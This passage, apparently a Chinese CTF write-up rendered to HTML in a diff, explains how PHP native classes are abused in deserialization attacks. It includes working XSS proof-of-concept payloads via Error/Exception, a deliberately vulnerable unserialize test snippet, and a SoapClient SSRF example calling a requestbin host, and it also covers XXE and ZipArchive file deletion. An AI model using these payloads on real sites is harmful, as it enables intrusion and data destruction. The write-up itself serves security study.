+    <span class="token keyword keyword-foreach">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword keyword-as">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword keyword-array">array</span><span class="token punctuation">(</span>
+            <span class="token string single-quoted-string">&apos;__destruct&apos;</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">&apos;__toString&apos;</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">&apos;__wakeup&apos;</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">&apos;__call&apos;</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">&apos;__callStatic&apos;</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">&apos;__get&apos;</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">&apos;__set&apos;</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">&apos;__isset&apos;</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">&apos;__unset&apos;</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">&apos;__invoke&apos;</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">&apos;__set_state&apos;</span>    <span class="token comment">// &#x53EF;&#x4EE5;&#x6839;&#x636E;&#x9898;&#x76EE;&#x73AF;&#x5883;&#x5C06;&#x6307;&#x5B9A;&#x7684;&#x65B9;&#x6CD5;&#x6DFB;&#x52A0;&#x8FDB;&#x6765;, &#x6765;&#x904D;&#x5386;&#x5B58;&#x5728;&#x6307;&#x5B9A;&#x65B9;&#x6CD5;&#x7684;&#x539F;&#x751F;&#x7C7B;</span>
+        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword keyword-print">print</span> <span class="token variable">$class</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&apos;::&apos;</span> <span class="token operator">.</span> <span class="token variable">$method</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;\n&quot;</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> 
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</pre><p>&#x5E38;&#x9047;&#x5230;&#x7684;&#x51E0;&#x4E2A; PHP &#x539F;&#x751F;&#x7C7B;&#x6709;&#x5982;&#x4E0B;&#x51E0;&#x4E2A;:</p>
+<pre class="language-text">Error
+Exception
+SoapClient
+DirectoryIterator
+SimpleXMLElement
+</pre>
+<h2 class="mume-header" id="%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E5%A6%82%E4%B8%8B">&#x5177;&#x4F53;&#x5229;&#x7528;&#x5982;&#x4E0B;&#xFF1A;</h2>
+
+<p>&#x4F7F;&#x7528; Error/Exception &#x5185;&#x7F6E;&#x7C7B;&#x8FDB;&#x884C; XSS</p>
+<p>Error &#x5185;&#x7F6E;&#x7C7B;<br>
+&#x9002;&#x7528;&#x4E8E;php7&#x7248;&#x672C;<br>
+&#x5728;&#x5F00;&#x542F;&#x62A5;&#x9519;&#x7684;&#x60C5;&#x51B5;&#x4E0B;</p>
+<p>Error&#x7C7B;&#x662F;php&#x7684;&#x4E00;&#x4E2A;&#x5185;&#x7F6E;&#x7C7B;&#xFF0C;&#x7528;&#x4E8E;&#x81EA;&#x52A8;&#x81EA;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;Error&#xFF0C;&#x5728;php7&#x7684;&#x73AF;&#x5883;&#x4E0B;&#x53EF;&#x80FD;&#x4F1A;&#x9020;&#x6210;&#x4E00;&#x4E2A;xss&#x6F0F;&#x6D1E;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x5185;&#x7F6E;&#x6709;&#x4E00;&#x4E2A; __toString() &#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5E38;&#x7528;&#x4E8E;PHP &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E2D;&#x3002;&#x5982;&#x679C;&#x6709;&#x4E2A;POP&#x94FE;&#x8D70;&#x5230;&#x4E00;&#x534A;&#x5C31;&#x8D70;&#x4E0D;&#x901A;&#x4E86;&#xFF0C;&#x4E0D;&#x5982;&#x5C1D;&#x8BD5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6765;&#x505A;&#x4E00;&#x4E2A;xss&#xFF0C;&#x5176;&#x5B9E;&#x6211;&#x770B;&#x5230;&#x7684;&#x8FD8;&#x662F;&#x6709;&#x597D;&#x4E00;&#x4E9B;cms&#x4F1A;&#x9009;&#x62E9;&#x76F4;&#x63A5;&#x4F7F;&#x7528; echo &#x7684;&#x5199;&#x6CD5;&#xFF0C;&#x5F53; PHP &#x5BF9;&#x8C61;&#x88AB;&#x5F53;&#x4F5C;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x8F93;&#x51FA;&#x6216;&#x4F7F;&#x7528;&#x65F6;&#x5019;&#xFF08;&#x5982;echo&#x7684;&#x65F6;&#x5019;&#xFF09;&#x4F1A;&#x89E6;&#x53D1;__toString &#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x6316;&#x6D1E;&#x7684;&#x65B0;&#x601D;&#x8DEF;&#x3002;</p>
+<p>&#x4E0B;&#x9762;&#x6F14;&#x793A;&#x5982;&#x4F55;&#x4F7F;&#x7528; Error &#x5185;&#x7F6E;&#x7C7B;&#x6765;&#x6784;&#x9020; XSS&#x3002;</p>
+<p>test:</p>
+<pre data-role="codeBlock" data-info="php" class="language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;whoami&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword keyword-echo">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span> 
+</pre><p>poc:</p>
+<pre data-role="codeBlock" data-info="php" class="language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword keyword-new">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword keyword-echo">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+
+</pre><p>Exception &#x5185;&#x7F6E;&#x7C7B;<br>
+&#x9002;&#x7528;&#x4E8E;php5&#x3001;7&#x7248;&#x672C;<br>
+&#x5F00;&#x542F;&#x62A5;&#x9519;&#x7684;&#x60C5;&#x51B5;&#x4E0B;</p>
+<pre data-role="codeBlock" data-info="php" class="language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword keyword-new">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;&lt;script&gt;alert(&apos;xss2&apos;)&lt;/script&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword keyword-echo">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</pre><p>&#x4F7F;&#x7528; Error/Exception &#x5185;&#x7F6E;&#x7C7B;&#x7ED5;&#x8FC7;&#x54C8;&#x5E0C;&#x6BD4;&#x8F83;</p>
+<p>Error&#x7C7B;<br>
+Error &#x662F;&#x6240;&#x6709;PHP&#x5185;&#x90E8;&#x9519;&#x8BEF;&#x7C7B;&#x7684;&#x57FA;&#x7C7B;&#xFF0C;&#x8BE5;&#x7C7B;&#x662F;&#x5728;PHP 7.0.0 &#x4E2D;&#x5F00;&#x59CB;&#x5F15;&#x5165;&#x7684;&#x3002;</p>
+<p>&#x7C7B;&#x5C5E;&#x6027;&#xFF1A;</p>
+<pre class="language-text">message&#xFF1A;&#x9519;&#x8BEF;&#x6D88;&#x606F;&#x5185;&#x5BB9;
+code&#xFF1A;&#x9519;&#x8BEF;&#x4EE3;&#x7801;
+file&#xFF1A;&#x629B;&#x51FA;&#x9519;&#x8BEF;&#x7684;&#x6587;&#x4EF6;&#x540D;
+line&#xFF1A;&#x629B;&#x51FA;&#x9519;&#x8BEF;&#x5728;&#x8BE5;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x884C;&#x6570;
+</pre>
+<p>Exception &#x7C7B;<br>
+Exception &#x662F;&#x6240;&#x6709;&#x5F02;&#x5E38;&#x7684;&#x57FA;&#x7C7B;&#xFF0C;&#x8BE5;&#x7C7B;&#x662F;&#x5728;PHP 5.0.0 &#x4E2D;&#x5F00;&#x59CB;&#x5F15;&#x5165;&#x7684;&#x3002;</p>
+<p>&#x7C7B;&#x5C5E;&#x6027;&#xFF1A;</p>
+<pre class="language-text">message&#xFF1A;&#x5F02;&#x5E38;&#x6D88;&#x606F;&#x5185;&#x5BB9;
+code&#xFF1A;&#x5F02;&#x5E38;&#x4EE3;&#x7801;
+file&#xFF1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x7684;&#x6587;&#x4EF6;&#x540D;
+line&#xFF1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x5728;&#x8BE5;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x884C;&#x53F7;
+</pre>
+<p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x5728;Error&#x548C;Exception&#x8FD9;&#x4E24;&#x4E2A;PHP&#x539F;&#x751F;&#x7C7B;&#x4E2D;&#x5185;&#x53EA;&#x6709; __toString &#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x5C06;&#x5F02;&#x5E38;&#x6216;&#x9519;&#x8BEF;&#x5BF9;&#x8C61;&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x3002;<br>
+&#x6211;&#x4EEC;&#x4EE5;Error&#x4E3A;&#x4F8B;&#xFF0C;&#x6211;&#x4EEC;&#x770B;&#x770B;&#x5F53;&#x89E6;&#x53D1;&#x4ED6;&#x7684; __toString &#x65B9;&#x6CD5;&#x65F6;&#x4F1A;&#x53D1;&#x751F;&#x4EC0;&#x4E48;&#xFF1A;</p>
+<pre data-role="codeBlock" data-info="php" class="language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword keyword-new">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;payload&quot;</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword keyword-echo">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+</pre><p>&#x6211;&#x8FD8;&#x60F3;&#x7740;&#x7528;&#x5B83;&#x6765;&#x5199;&#x9A6C;&#x7684;&#xFF0C;&#x663E;&#x7136;&#x662F;&#x4E0D;&#x884C;&#xFF0C;&#x90FD;&#x62A5;&#x9519;&#x4E86;&#xFF0C;&#x7A0B;&#x5E8F;&#x6CA1;&#x6CD5;&#x8FD0;&#x884C;&#x4E86;&#x3002;&#x8FD8;&#x6709;&#x5C31;&#x662F;&#x501F;&#x52A9;__tostring&#x6253;&#x5370;&#x51FA;&#x6765;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF08;php&#x4EE3;&#x7801;&#xFF09;&#x4F1A;&#x88AB;&#x5904;&#x7406;&#xFF0C;&#x88AB;&#x6CE8;&#x91CA;&#x6389;&#x4E86;&#x3002;<br>
+<img src="images/2022-08-04-19-22-30.png" alt></p>
+<p>Exception &#x7C7B;&#x4E0E; Error &#x7684;&#x4F7F;&#x7528;&#x548C;&#x7ED3;&#x679C;&#x5B8C;&#x5168;&#x4E00;&#x6837;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7; Exception &#x7C7B;&#x9002;&#x7528;&#x4E8E;PHP 5&#x548C;7&#xFF0C;&#x800C; Error &#x53EA;&#x9002;&#x7528;&#x4E8E; PHP 7&#x3002;<br>
+Error&#x548C;Exception&#x7C7B;&#x7684;&#x8FD9;&#x4E00;&#x70B9;&#x5728;&#x7ED5;&#x8FC7;&#x5728;PHP&#x7C7B;&#x4E2D;&#x7684;&#x54C8;&#x5E0C;&#x6BD4;&#x8F83;&#x65F6;&#x5F88;&#x6709;&#x7528;</p>
+<p>&#x4F7F;&#x7528; SoapClient &#x7C7B;&#x8FDB;&#x884C; SSRF</p>
+<p>SoapClient &#x7C7B;<br>
+PHP &#x7684;&#x5185;&#x7F6E;&#x7C7B; SoapClient &#x662F;&#x4E00;&#x4E2A;&#x4E13;&#x95E8;&#x7528;&#x6765;&#x8BBF;&#x95EE;web&#x670D;&#x52A1;&#x7684;&#x7C7B;&#xFF0C;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;SOAP&#x534F;&#x8BAE;&#x8BBF;&#x95EE;Web&#x670D;&#x52A1;&#x7684; PHP &#x5BA2;&#x6237;&#x7AEF;&#x3002;</p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x8BE5;&#x5185;&#x7F6E;&#x7C7B;&#x6709;&#x4E00;&#x4E2A; __call &#x65B9;&#x6CD5;&#xFF0C;&#x5F53; __call &#x65B9;&#x6CD5;&#x88AB;&#x89E6;&#x53D1;&#x540E;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x53D1;&#x9001; HTTP &#x548C; HTTPS &#x8BF7;&#x6C42;&#x3002;&#x6B63;&#x662F;&#x8FD9;&#x4E2A; __call &#x65B9;&#x6CD5;&#xFF0C;&#x4F7F;&#x5F97; SoapClient &#x7C7B;&#x53EF;&#x4EE5;&#x88AB;&#x6211;&#x4EEC;&#x8FD0;&#x7528;&#x5728; SSRF &#x4E2D;&#x3002;SoapClient &#x8FD9;&#x4E2A;&#x7C7B;&#x4E5F;&#x7B97;&#x662F;&#x76EE;&#x524D;&#x88AB;&#x6316;&#x6398;&#x51FA;&#x6765;&#x6700;&#x597D;&#x7528;&#x7684;&#x4E00;&#x4E2A;&#x5185;&#x7F6E;&#x7C7B;&#x3002;</p>
+<p>public SoapClient :: SoapClient(mixed <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mi>s</mi><mi>d</mi><mi>l</mi><mo stretchy="false">[</mo><mtext>&#xFF0C;</mtext><mi>a</mi><mi>r</mi><mi>r</mi><mi>a</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">wsdl [&#xFF0C;array</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">s</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">[</span><span class="mord cjk_fallback">&#xFF0C;</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>options ])<br>
+&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x7528;&#x6765;&#x6307;&#x660E;&#x662F;&#x5426;&#x662F;wsdl&#x6A21;&#x5F0F;&#xFF0C;&#x5C06;&#x8BE5;&#x503C;&#x8BBE;&#x4E3A;null&#x5219;&#x8868;&#x793A;&#x975E;wsdl&#x6A21;&#x5F0F;&#x3002;<br>
+&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#xFF0C;&#x5982;&#x679C;&#x5728;wsdl&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x6B64;&#x53C2;&#x6570;&#x53EF;&#x9009;&#xFF1B;&#x5982;&#x679C;&#x5728;&#x975E;wsdl&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x5219;&#x5FC5;&#x987B;&#x8BBE;&#x7F6E;location&#x548C;uri&#x9009;&#x9879;&#xFF0C;&#x5176;&#x4E2D;location&#x662F;&#x8981;&#x5C06;&#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x5230;&#x7684;SOAP&#x670D;&#x52A1;&#x5668;&#x7684;URL&#xFF0C;&#x800C;uri &#x662F;SOAP&#x670D;&#x52A1;&#x7684;&#x76EE;&#x6807;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x3002;</p>
+<p>&#x4F7F;&#x7528; SoapClient &#x7C7B;&#x8FDB;&#x884C; SSRF</p>
+<pre data-role="codeBlock" data-info="php" class="language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword keyword-new">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword keyword-array">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&apos;location&apos;</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">&apos;http://requestbin.net/r/doe3ps5d&apos;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&apos;uri&apos;</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">&apos;ssrf&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword keyword-echo">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">-&gt;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// &#x968F;&#x4FBF;&#x8C03;&#x7528;&#x5BF9;&#x8C61;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65B9;&#x6CD5;, &#x89E6;&#x53D1;__call&#x65B9;&#x6CD5;&#x8FDB;&#x884C;ssrf</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</pre><p>&#x4F46;&#x662F;&#xFF0C;&#x7531;&#x4E8E;&#x5B83;&#x4EC5;&#x9650;&#x4E8E;HTTP/HTTPS&#x534F;&#x8BAE;&#xFF0C;&#x6240;&#x4EE5;&#x7528;&#x5904;&#x4E0D;&#x662F;&#x5F88;&#x5927;&#x3002;&#x800C;&#x5982;&#x679C;&#x8FD9;&#x91CC;HTTP&#x5934;&#x90E8;&#x8FD8;&#x5B58;&#x5728;CRLF&#x6F0F;&#x6D1E;&#x7684;&#x8BDD;&#xFF0C;&#x4F46;&#x6211;&#x4EEC;&#x5219;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;SSRF+CRLF&#xFF0C;&#x63D2;&#x5165;&#x4EFB;&#x610F;&#x7684;HTTP&#x5934;&#x3002;</p>
+<p>CRLF&#x662F;&#x201C;&#x56DE;&#x8F66;+&#x6362;&#x884C;&#x201D;&#xFF08;\r\n&#xFF09;&#x7684;&#x7B80;&#x79F0;&#xFF0C;&#x5176;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7F16;&#x7801;&#x5206;&#x522B;&#x4E3A;0x0d&#x548C;0x0a&#x3002;&#x5728;HTTP&#x534F;&#x8BAE;&#x4E2D;&#xFF0C;HTTP header&#x4E0E;HTTP Body&#x662F;&#x7528;&#x4E24;&#x4E2A;CRLF&#x5206;&#x9694;&#x7684;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5C31;&#x662F;&#x6839;&#x636E;&#x8FD9;&#x4E24;&#x4E2A;CRLF&#x6765;&#x53D6;&#x51FA;HTTP&#x5185;&#x5BB9;&#x5E76;&#x663E;&#x793A;&#x51FA;&#x6765;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x4E00;&#x65E6;&#x6211;&#x4EEC;&#x80FD;&#x591F;&#x63A7;&#x5236;HTTP&#x6D88;&#x606F;&#x5934;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x6CE8;&#x5165;&#x4E00;&#x4E9B;&#x6076;&#x610F;&#x7684;&#x6362;&#x884C;&#xFF0C;&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x5C31;&#x80FD;&#x6CE8;&#x5165;&#x4E00;&#x4E9B;&#x4F1A;&#x8BDD;Cookie&#x6216;&#x8005;HTML&#x4EE3;&#x7801;&#x3002;CRLF&#x6F0F;&#x6D1E;&#x5E38;&#x51FA;&#x73B0;&#x5728;Location&#x4E0E;Set-cookie&#x6D88;&#x606F;&#x5934;&#x4E2D;&#x3002;</p>
+<p>&#x5BF9;&#x4E8E;&#x5982;&#x4F55;&#x53D1;&#x9001;POST&#x7684;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x8FD9;&#x91CC;&#x9762;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x5751;&#xFF0C;&#x5C31;&#x662F; Content-Type &#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x8981;&#x63D0;&#x4EA4;&#x7684;&#x662F;POST&#x6570;&#x636E; Content-Type &#x7684;&#x503C;&#x6211;&#x4EEC;&#x8981;&#x8BBE;&#x7F6E;&#x4E3A; application/x-www-form-urlencoded&#xFF0C;&#x8FD9;&#x91CC;&#x5982;&#x4F55;&#x4FEE;&#x6539; Content-Type &#x7684;&#x503C;&#x5462;&#xFF1F;&#x7531;&#x4E8E; Content-Type &#x5728; User-Agent &#x7684;&#x4E0B;&#x9762;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; SoapClient &#x6765;&#x8BBE;&#x7F6E; User-Agent &#xFF0C;&#x5C06;&#x539F;&#x6765;&#x7684; Content-Type &#x6324;&#x4E0B;&#x53BB;&#xFF0C;&#x4ECE;&#x800C;&#x518D;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x65B0;&#x7684; Content-Type &#x3002;</p>
+<hr>
+<p>&#x4F7F;&#x7528; SimpleXMLElement &#x7C7B;&#x8FDB;&#x884C; XXE<br>
+SimpleXMLElement &#x8FD9;&#x4E2A;&#x5185;&#x7F6E;&#x7C7B;&#x7528;&#x4E8E;&#x89E3;&#x6790; XML &#x6587;&#x6863;&#x4E2D;&#x7684;&#x5143;&#x7D20;&#x3002;</p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570; data_is_url &#x4E3A; true&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x8FDC;&#x7A0B;xml&#x6587;&#x4EF6;&#x7684;&#x8F7D;&#x5165;&#x3002;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x5E38;&#x91CF;&#x503C;&#x6211;&#x4EEC;&#x8BBE;&#x7F6E;&#x4E3A;2&#x5373;&#x53EF;&#x3002;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570; data &#x5C31;&#x662F;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x8BBE;&#x7F6E;&#x7684;payload&#x7684;url&#x5730;&#x5740;&#xFF0C;&#x5373;&#x7528;&#x4E8E;&#x5F15;&#x5165;&#x7684;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x7684;url&#x3002;</p>
+<p>&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x76EE;&#x6807;&#x8C03;&#x7528;&#x7684;&#x7C7B;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4FBF;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; SimpleXMLElement &#x8FD9;&#x4E2A;&#x5185;&#x7F6E;&#x7C7B;&#x6765;&#x6784;&#x9020; XXE&#x3002;</p>
+<p>&#x6709;&#x7248;&#x672C;&#x8981;&#x6C42;<br>
+<img src="images/2022-08-04-19-31-14.png" alt></p>
+<p>&#x4F7F;&#x7528; ZipArchive &#x7C7B;&#x6765;&#x5220;&#x9664;&#x6587;&#x4EF6;<br>
+ZipArchive &#x7C7B;<br>
+PHP ZipArchive&#x7C7B;&#x662F;PHP&#x7684;&#x4E00;&#x4E2A;&#x539F;&#x751F;&#x7C7B;&#xFF0C;&#x5B83;&#x662F;&#x5728;PHP 5.20&#x4E4B;&#x540E;&#x5F15;&#x5165;&#x7684;&#x3002;ZipArchive&#x7C7B;&#x53EF;&#x4EE5;&#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x538B;&#x7F29;&#x4E0E;&#x89E3;&#x538B;&#x7F29;&#x5904;&#x7406;</p>
+<p><img src="images/2022-08-04-19-32-07.png" alt></p>
+<p>&#x6CE8;&#x610F;&#xFF0C;&#x5982;&#x679C;&#x8BBE;&#x7F6E;flags&#x53C2;&#x6570;&#x7684;&#x503C;&#x4E3A; ZipArchive::OVERWRITE &#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x5220;&#x9664;&#x3002;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x8DDF;&#x8FDB;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x770B;&#x5230;const OVERWRITE = 8&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5C06;OVERWRITE&#x5B9A;&#x4E49;&#x4E3A;&#x4E86;&#x5E38;&#x91CF;8&#xFF0C;&#x6211;&#x4EEC;&#x5728;&#x8C03;&#x7528;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5C06;flags&#x8D4B;&#x503C;&#x4E3A;8&#x3002;</p>
+<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;ZipArchive&#x539F;&#x751F;&#x7C7B;&#x8C03;&#x7528;open&#x65B9;&#x6CD5;&#x5220;&#x9664;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x6587;&#x4EF6;&#x3002;</p>
+<p>&#x53C2;&#x8003;&#xFF1A;<a href="https://blog.csdn.net/cjdgg/article/details/115314651">https://blog.csdn.net/cjdgg/article/details/115314651</a></p>
+<h2 class="mume-header" id="%E4%BB%A5%E4%B8%8A%E6%98%AF%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E5%86%85%E7%BD%AE%E7%B1%BB%E5%BA%94%E7%94%A8%E4%BD%86%E6%98%AF%E6%88%91%E5%BE%97%E8%AF%B4%E6%9C%AC%E9%A2%98%E7%9A%84%E7%9A%84%E7%8E%AF%E5%A2%83%E6%98%AF%E7%A6%81%E6%AD%A2%E8%81%94%E5%A4%96%E7%BD%91%E7%9A%84%E5%8D%B3%E4%BD%A0%E6%B2%A1%E5%8A%9E%E6%B3%95%E8%BF%9C%E7%A8%8B%E4%BD%BF%E7%94%A8vps%E5%8C%85%E5%90%AB%E5%B9%B6%E4%B8%94%E6%B2%A1%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%A9%E5%B1%95%E6%98%AF%E4%BB%A5%E5%B8%B8%E8%A7%84%E7%9A%84%E6%96%B9%E6%B3%95%E9%83%BDout%E6%8E%89%E4%BA%86">&#x4EE5;&#x4E0A;&#x662F;&#x4E00;&#x4E9B;&#x5E38;&#x89C1;&#x7684;&#x5185;&#x7F6E;&#x7C7B;&#x5E94;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x5F97;&#x8BF4;&#x672C;&#x9898;&#x7684;&#x7684;&#x73AF;&#x5883;&#x662F;&#x7981;&#x6B62;&#x8054;&#x5916;&#x7F51;&#x7684;&#xFF1A;&#x5373;&#x4F60;&#x6CA1;&#x529E;&#x6CD5;&#x8FDC;&#x7A0B;&#x4F7F;&#x7528;vps&#x5305;&#x542B;&#xFF0C;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x53CD;&#x5